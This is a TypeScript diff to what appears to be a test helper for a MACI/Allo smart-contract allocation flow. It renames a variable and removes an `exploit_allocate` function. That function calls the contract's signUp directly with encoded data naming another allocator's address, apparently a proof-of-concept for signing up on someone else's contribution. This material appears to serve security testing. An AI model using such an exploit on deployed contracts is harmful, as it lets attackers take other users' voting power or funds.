@@ -30,45 +30,18 @@ export const allocate = async ({
     pubSignals: dt._pubSignals.map((x) => BigInt(x)),
   };
 
-  const contributeEncodedData1 = (await prepareAllocationData({
+  const contributeEncodedData = (await prepareAllocationData({
     publicKey: keypair.pubKey.serialize(),
     amount: contributionAmount,
     proof: emptyProof,
   })) as string;
+
   // signup2
 
   const SignUpTx = await AlloContract.connect(allocator).allocate(
     1n,
-    contributeEncodedData1,
+    contributeEncodedData,
     { value: contributionAmount.toString() }
   );
   await SignUpTx.wait();
-};
-
-export const exploit_allocate = async ({
-  MACIContract,
-  allocator,
-  keypair,
-  allocatorToGetFromHisContributionAmount,
-}: {
-  keypair: Keypair;
-  MACIContract: ClonableMACI;
-  allocator: Signer;
-  allocatorToGetFromHisContributionAmount: string;
-}) => {
-  let types = ["address"];
-
-  const data = AbiCoder.defaultAbiCoder().encode(types, [
-    allocatorToGetFromHisContributionAmount,
-  ]);
-
-  const SignUpTx = MACIContract.connect(allocator).signUp(
-    {
-      x: keypair.pubKey.asContractParam().x as bigint,
-      y: keypair.pubKey.asContractParam().y as bigint,
-    },
-    data as BytesLike,
-    data as BytesLike
-  );
-  return SignUpTx;
 };
